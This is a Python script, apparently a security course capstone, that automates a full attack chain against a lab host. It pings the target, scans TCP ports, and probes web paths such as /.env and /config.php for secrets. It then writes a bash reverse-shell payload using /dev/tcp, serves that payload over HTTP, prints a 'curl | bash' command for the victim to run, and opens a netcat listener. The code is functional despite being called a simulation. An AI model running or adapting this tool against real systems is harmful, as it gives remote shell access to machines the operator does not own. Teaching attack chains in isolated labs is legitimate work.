#!/usr/bin/env python3
"""
attack_chain_simulator.py — Automated Attack Chain Orchestrator (Capstone)
========================================================================
Project 11 · Module 01 · Week 01

A comprehensive simulation engine that executes a unified attack workflow:
  PHASE 1: Recon — Local hostname resolution and up-check.
  PHASE 2: Scan  — Multi-threaded port probing (TCP Connect).
  PHASE 3: Enum  — Pivoted HTTP path discovery for leaked secrets.
  PHASE 4: Deliver — Payload generation, staging, and HTTP hosting.
  PHASE 5: Access — Foreground listener execution for foothold acquisition.

Forensics: All events are logged to /tmp/attack_log.txt for timeline reconstruction.

Author : Applied AI Security Projects
Lab    : 192.168.100.0/24 | Kali .10 | Webserver .30
"""

from __future__ import annotations

import argparse
import os
import queue
import signal
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Dict, Optional


# ---------------------------------------------------------------------------
# ANSI color helpers
# ---------------------------------------------------------------------------

_USE_COLOR = sys.stdout.isatty()

def _c(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _USE_COLOR else text

def green(t: str) -> str:   return _c("32;1", t)
def yellow(t: str) -> str:  return _c("33", t)
def cyan(t: str) -> str:    return _c("36", t)
def red(t: str) -> str:     return _c("31;1", t)
def bold(t: str) -> str:    return _c("1", t)
def grey(t: str) -> str:    return _c("90", t)


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

class AttackChainSimulator:
    """
    Main controller for the attack simulation.
    """

    def __init__(self, target: str, lhost: str, lport: int) -> None:
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.http_port = 8080
        self.log_file = "/tmp/attack_log.txt"
        self.staging_dir = "/tmp/sim_staging"
        self.payload_name = "shell.sh"
        self._web_proc: Optional[subprocess.Popen] = None
        self.open_ports: List[int] = []

    def log(self, phase: str, message: str) -> None:
        """Writes a timestamped entry to the forensic log and absolute console."""
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        entry = f"[{ts}] [{phase:^8}] {message}"
        print(f"  {entry}")
        with open(self.log_file, "a") as f:
            f.write(entry + "\n")

    def run_recon(self) -> bool:
        """Phase 1: Recon"""
        self.log("RECON", f"Initiating discovery for target {self.target}...")
        try:
            ip = socket.gethostbyname(self.target)
            self.log("RECON", f"Resolved {self.target} → {ip}")
            # Quick ping check (using subprocess)
            res = subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL)
            if res.returncode == 0:
                self.log("RECON", "Host is UP and responding to ICMP.")
                return True
            else:
                self.log("RECON", "Host did not respond to ping. Proceeding with scan anyway...")
                return True
        except socket.gaierror:
            self.log("RECON", f"FAILED: Could not resolve {self.target}")
            return False

    def run_scan(self) -> None:
        """Phase 2: Port Scanning"""
        self.log("SCAN", "Scanning ports 1-1024 (Multi-threaded TCP Connect)...")
        ports_to_scan = range(1, 1025)
        
        def scan_worker(p: int):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.4)
            if s.connect_ex((self.target, p)) == 0:
                self.log("SCAN", f"OPEN: {p}/tcp")
                self.open_ports.append(p)
            s.close()

        threads = []
        for p in ports_to_scan:
            t = threading.Thread(target=scan_worker, args=(p,))
            t.start()
            threads.append(t)
            if len(threads) > 50: # Cap concurrency
                for th in threads: th.join()
                threads = []
        for th in threads: th.join()

    def run_enum(self) -> None:
        """Phase 3: Enumeration"""
        if not self.open_ports:
            self.log("ENUM", "Skipping enumeration: No open ports found.")
            return

        # Pivot to HTTP enumeration if port 80 or 8080 is open
        http_ports = [p for p in self.open_ports if p in (80, 443, 8080)]
        for p in http_ports:
            self.log("ENUM", f"HTTP detected on {p}. Probing for sensitive endpoints...")
            paths = ["/.env", "/config.php", "/admin", "/backup"]
            for path in paths:
                url = f"http://{self.target}:{p}{path}"
                try:
                    req = urllib.request.Request(url, method="HEAD")
                    with urllib.request.urlopen(req, timeout=1.0) as resp:
                        if resp.status == 200:
                            self.log("ENUM", f"FOUND SENSITIVE PATH: {url}")
                except:
                    continue

    def run_delivery(self) -> None:
        """Phase 4: Deliver"""
        self.log("DELIVER", "Creating stage-1 payload...")
        if not os.path.exists(self.staging_dir):
            os.makedirs(self.staging_dir)
            
        payload = (
            "#!/bin/bash\n"
            f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\n"
        )
        with open(os.path.join(self.staging_dir, self.payload_name), "w") as f:
            f.write(payload)

        self.log("DELIVER", f"Staring delivery server on port {self.http_port}...")
        self._web_proc = subprocess.Popen(
            [sys.executable, "-m", "http.server", str(self.http_port)],
            cwd=self.staging_dir,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        cmd = f"curl -s http://{self.lhost}:{self.http_port}/{self.payload_name} | bash"
        self.log("DELIVER", f"VICTIM COMMAND: {green(cmd)}")

    def run_access(self) -> None:
        """Phase 5: Access"""
        self.log("ACCESS", f"Spawning terminal listener on port {self.lport}...")
        try:
            # We record the start of access in the log
            self.log("ACCESS", "Awaiting incoming connection...")
            subprocess.run(["nc", "-lvnp", str(self.lport)])
        except KeyboardInterrupt:
            self.log("ACCESS", "Simulation terminated by user.")
        finally:
            self.cleanup()

    def cleanup(self) -> None:
        """Forensic Cleanup"""
        self.log("CLEANUP", "Terminating delivery processes...")
        if self._web_proc:
            self._web_proc.terminate()
        
        payload_path = os.path.join(self.staging_dir, self.payload_name)
        if os.path.exists(payload_path):
            os.remove(payload_path)
            
        self.log("CLEANUP", f"Simulation finished. Logs saved to {self.log_file}")
        print(f"\n{green('[+] Full Attack Chain Simulation Complete.')}")


# ---------------------------------------------------------------------------
# Main Entry Point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Professional Attack Chain Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("target", help="Target machine IP or hostname")
    parser.add_argument("--lhost", default="192.168.100.10", help="Attacker IP (LHOST)")
    parser.add_argument("--lport", type=int, default=4444, help="Attacker port (LPORT)")
    
    args = parser.parse_args()

    sim = AttackChainSimulator(args.target, args.lhost, args.lport)
    
    # Handle signals
    def handler(sig, frame):
        sim.cleanup()
        sys.exit(0)
    signal.signal(signal.SIGINT, handler)

    print(cyan(f"\n{'='*20} ATTACK CHAIN SIMULATOR START {'='*20}"))
    
    if sim.run_recon():
        sim.run_scan()
        sim.run_enum()
        sim.run_delivery()
        sim.run_access()
    else:
        print(red("\n[!] Recon phase failed. Check target connectivity."))

if __name__ == "__main__":
    main()
